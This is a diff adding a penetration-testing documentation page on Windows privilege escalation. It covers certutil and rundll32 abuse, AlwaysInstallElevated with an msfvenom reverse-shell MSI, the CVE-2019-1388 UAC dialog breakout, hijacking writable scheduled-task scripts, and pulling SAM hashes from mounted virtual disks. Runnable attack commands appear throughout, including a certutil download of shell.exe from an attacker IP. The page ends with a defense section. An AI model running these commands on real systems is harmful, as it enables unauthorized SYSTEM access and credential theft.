@@ -1,0 +1,167 @@
+---
+title: Miscellaneous Techniques
+description: A grab-bag of Windows escalation paths that don't fit the token/group/service buckets - living-off-the-land binaries (certutil, rundll32), AlwaysInstallElevated MSI abuse, the CVE-2019-1388 UAC certificate-dialog GUI breakout, weak-ACL scheduled-task scripts, credentials stashed in account description fields, and mounting captured VHDX/VMDK virtual disks to pull the offline SAM. Each is a quick enumeration check worth running before heavier work.
+mitre: [T1068, T1140, T1003.002]
+d3fend: [D3-PSA, D3-FA]
+impact: [PrivEsc, SystemCompromise]
+owasp: []
+noise: moderate
+sidebar:
+  order: 18
+  label: Misc techniques
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+A set of independent checks that each take seconds and occasionally hand you SYSTEM for free. None is a methodology - they're pattern-matches to run alongside the main loop.
+
+```powershell
+# AlwaysInstallElevated - BOTH keys must be 0x1
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Creds stashed in description fields
+Get-LocalUser | ft Name,Description
+Get-WmiObject Win32_OperatingSystem | select Description
+
+# Scheduled tasks you can influence (look for a writable script a SYSTEM task runs)
+Get-ScheduledTask | select TaskName,State
+.\accesschk64.exe /accepteula -s -d C:\Scripts\     # RW BUILTIN\Users on a task's script dir?
+
+# LOLBAS file transfer with a Microsoft-signed binary
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.exe shell.exe
+```
+
+Success indicator varies by technique: a SYSTEM shell (AlwaysInstallElevated MSI, CVE-2019-1388, a hijacked SYSTEM task), a recovered password (description field), or offline-crackable local hashes (mounted virtual disk).
+
+## Living off the land (LOLBAS)
+
+The [LOLBAS project](https://lolbas-project.github.io/) catalogues Microsoft-signed binaries with unexpected, attacker-useful functionality - file transfer, code execution, DLL loading, UAC bypass. Because they're signed and native, they slip past application whitelisting and look less suspicious than dropped tooling, which matters most on a locked-down managed workstation or an evasive engagement.
+
+`certutil.exe` (intended for certificates) is the classic - it downloads files and base64-encodes/decodes them:
+
+```powershell
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.exe shell.exe   # download
+certutil -encode file1 encoded.b64                                            # encode (move text-safe)
+certutil -decode encoded.b64 file2                                            # decode on the target
+```
+
+`rundll32.exe` executes a DLL export, so a payload DLL (local or on an SMB share) becomes a reverse shell. LOLBAS isn't itself an escalation - it's the *plumbing* (get your tool across, run it, evade) that the other techniques rely on.
+
+<Aside type="caution">
+`certutil` download and the common LOLBAS one-liners are now heavily signatured by AV/EDR - certutil pulling an executable from an HTTP URL is a well-known IOC. Use them where whitelisting is the obstacle (signed binary needed) rather than assuming they're quiet, and prefer a less-watched LOLBAS entry when evasion matters.
+</Aside>
+
+## AlwaysInstallElevated
+
+A Group Policy misconfiguration that lets *any* user install an MSI as SYSTEM. The elevated install requires **both** the per-user (HKCU) and per-machine (HKLM) keys set to `0x1` - but note the asymmetry: **HKLM is the gate** (only an admin can set it), whereas HKCU lives in *your own* hive and is user-writable. So `HKLM = 0x1` is the finding that matters: if it's enabled but HKCU isn't, you simply set HKCU yourself and proceed. `HKLM = 0x0` can't be fixed from a standard user, so setting HKCU alone does nothing. Check both:
+
+```powershell
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # the gate
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # yours to set
+#   AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+If HKLM is `0x1` but HKCU isn't present, set your own before installing:
+
+```cmd
+reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+```
+
+With both set, build a malicious MSI and install it silently:
+
+```shell
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+```
+```cmd
+msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+```
+
+The reverse shell returns as `NT AUTHORITY\SYSTEM`. PowerUp and winPEAS both flag this automatically (see [weak permissions](/codex/windows/privesc/weak-permissions/#enumerate-the-weakness) for the scanner workflow). Mitigation is simply disabling both policy settings.
+
+## CVE-2019-1388 (UAC certificate dialog)
+
+A GUI-only escalation in the UAC consent flow. An old Microsoft-signed binary (`hhupd.exe`) carries a certificate whose **Issued By** field renders as a hyperlink (OID `1.3.6.1.4.1.311.2.1.10` / `SpcSpAgencyInfo`). Running it elevated and clicking that link opens a browser **as SYSTEM**; from there, **View page source → Save As** gives a SYSTEM file dialog, which doubles as a file browser - navigate to System32, show all files, and right-click → Open `cmd.exe` to get a SYSTEM shell (the dialog's own process is SYSTEM, so the child it launches is too).
+
+```
+Run hhupd.exe as administrator
+ → "Show information about the publisher's certificate"
+ → General tab → click the "Issued by" hyperlink → OK
+ → browser opens as SYSTEM → right-click → View page source
+ → right-click → Save as  (this opens a SYSTEM file-browser dialog)
+ → "Save as type" → All Files (*.*) → browse to C:\Windows\System32
+ → right-click cmd.exe → Open   ← spawns cmd.exe as SYSTEM (do NOT just type the path + Enter; that tries to SAVE a file, it won't execute)
+```
+
+Key constraints: it needs **interactive GUI access** (console or RDP), not just a shell, and it was patched in November 2019 - so it only lands on an unpatched host where you have a desktop. Always worth a try when you land in a GUI session as a low-priv user on an older build.
+
+## Scheduled tasks
+
+Enumerate with `schtasks /query /fo LIST /v` or `Get-ScheduledTask`. Note the ceiling: a standard user **cannot read admin-created tasks** - their definitions live in `C:\Windows\System32\Tasks`, which users can't read - so your view is mostly your own tasks plus the built-in ones:
+
+```powershell
+Get-ScheduledTask | select TaskName,State
+schtasks /query /fo LIST /v        # Run As User: SYSTEM on anything interesting?
+```
+
+The real win isn't editing the task object - it's a **script the task runs** sitting somewhere with weak ACLs. A writable directory is the lead, but confirm the **script file itself** is writable before relying on it - a file can carry a protected, non-inheriting ACL that denies writes even when its parent folder grants `Users` RW:
+
+```
+:: 1. find a candidate directory (-d checks the DIRECTORY ACL only)
+.\accesschk64.exe /accepteula -s -d C:\Scripts\
+#  C:\Scripts   RW BUILTIN\Users
+
+:: 2. CONFIRM write/append on the actual script (no -d → checks the file's own ACL)
+.\accesschk64.exe /accepteula -quv C:\Scripts\db-backup.ps1
+#  RW BUILTIN\Users   FILE_APPEND_DATA / FILE_WRITE_DATA   ← only now is append safe
+```
+
+Once the file is confirmed writable, append a beacon/one-liner to it and wait for the schedule. This is the scheduled-task instance of the general "a privileged process runs a file I can modify" pattern - the same shape as modifiable [autoruns and service binaries](/codex/windows/privesc/weak-permissions/#5-modifiable-autorun-binary). It's patient (waits on the schedule) but reliable.
+
+## Account description fields
+
+Admins occasionally stash a password in a user or computer **description** field. A two-second check:
+
+```powershell
+Get-LocalUser | ft Name,Description
+# secsvc    True    Network scanner - do not change password   ← and sometimes the password itself
+Get-WmiObject Win32_OperatingSystem | select Description
+```
+
+This is the local-account cousin of the service-account `Comment` field already covered in [initial enumeration](/codex/windows/privesc/initial-enumeration/) - check both, it costs nothing.
+
+## Mounting captured virtual disks (VHDX / VMDK)
+
+Hunting shares ([Snaffler](https://github.com/SnaffCon/Snaffler), covered in [credential hunting](/codex/windows/privesc/credential-hunting/#network-shares)) sometimes turns up `.vhd` / `.vhdx` (Hyper-V) or `.vmdk` (VMware) virtual disks - backups of live hosts. A disk image of a machine you couldn't escalate on is often more valuable than the live host: mount it offline and you have its entire filesystem with no ACLs in your way.
+
+```shell
+# Linux attack host
+guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk          # VMDK
+guestmount --add WEBSRV10.vhdx --ro -m /dev/sda1 /mnt/vhdx # VHD/VHDX
+```
+
+On Windows, right-click → **Mount** (VHD/VHDX) or **Map Virtual Disk** (VMDK), or `Mount-VHD`. Once mounted, the point is the **offline registry hives** - grab `SAM`, `SECURITY`, and `SYSTEM` from `\Windows\System32\config\` and extract local hashes:
+
+```shell
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+# Administrator:500:aad3b435...:cf3a5525ee9414229e66279623ed5c58:::
+```
+
+That local Administrator hash frequently works via pass-the-hash on *other* hosts in the environment (shared local-admin passwords). The hive-to-hashes mechanics are the same as [Backup Operators](/codex/windows/privesc/backup-operators/); mounting a captured disk is just another way to reach an offline SAM without touching the live target - and it gives you everything HiveNightmare would, with no exploit (see [kernel exploits](/codex/windows/privesc/kernel-exploits/#hivenightmare--serioussam-cve-2021-36934)).
+
+## Defense
+
+- **AlwaysInstallElevated** - never enable it; it's a direct any-user-to-SYSTEM path. Audit both Installer policy keys.
+- **CVE-2019-1388** - patch (fixed Nov 2019); restrict interactive logon for low-privileged users on sensitive hosts.
+- **Scheduled tasks** - store task scripts in admin-only directories; audit ACLs on any script a privileged task runs, and baseline the scripts themselves.
+- **Description fields** - never store secrets in user/computer descriptions or comments; they're world-readable.
+- **Virtual disks** - treat `.vhdx`/`.vmdk` backups as crown-jewel data: encrypt them, lock the shares that hold them, and rotate local-admin passwords (LAPS) so a captured SAM hash isn't reusable across hosts.
+- **LOLBAS** - application control that allows all signed binaries won't stop these; alert on anomalous use (certutil fetching executables, rundll32 with odd arguments, msiexec installing from user paths).
+
+## Related
+
+- [Weak permissions](/codex/windows/privesc/weak-permissions/) - the writable-file-a-privileged-process-runs pattern behind the scheduled-task technique, plus the scanners that flag AlwaysInstallElevated
+- [Credential hunting](/codex/windows/privesc/credential-hunting/) - Snaffler and the share sweep that surfaces virtual-disk backups and description-field leads
+- [Backup Operators](/codex/windows/privesc/backup-operators/) - the SAM/SYSTEM-hive-to-hashes flow the mounted-disk technique feeds
+- [Kernel exploits](/codex/windows/privesc/kernel-exploits/) - HiveNightmare reaches the same offline SAM via a shadow-copy bug instead of a captured disk
